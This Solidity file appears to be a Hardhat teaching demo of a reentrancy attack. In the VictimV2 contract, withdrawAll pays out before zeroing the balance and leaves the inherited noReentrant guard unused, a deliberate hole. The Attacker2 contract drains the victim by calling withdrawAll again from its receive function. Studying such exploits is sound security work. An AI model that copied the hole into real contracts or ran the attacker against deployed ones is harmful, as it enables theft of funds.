// SPDX-License-Identifier: MIT
import "hardhat/console.sol";

pragma solidity 0.8.18;

abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract VictimV2 is ReentrancyGuard {
    mapping(address => uint) public userBalances;

    function deposit() external payable {
        require(msg.value > 0, "not enought ether");
        userBalances[msg.sender] += msg.value;
    }

    function withdrawAll() external {
        require(userBalances[msg.sender] > 0, "not enough eth to withdraw");
        (bool success, ) = msg.sender.call{value: userBalances[msg.sender]}("");
        require(success, "withdraw fail");

        userBalances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return userBalances[msg.sender];
    }
}

contract Attacker2 {
    VictimV2 private victim;

    constructor(address _victim) {
        victim = VictimV2(_victim);
    }

    function attack() external payable {
        require(msg.value > 0, "attach need some eth");
        victim.deposit{value: msg.value}();
        victim.withdrawAll();
    }

    receive() external payable {
        console.log("received", msg.value);
        if (address(victim).balance > 0) {
            victim.withdrawAll();
        }
    }
}
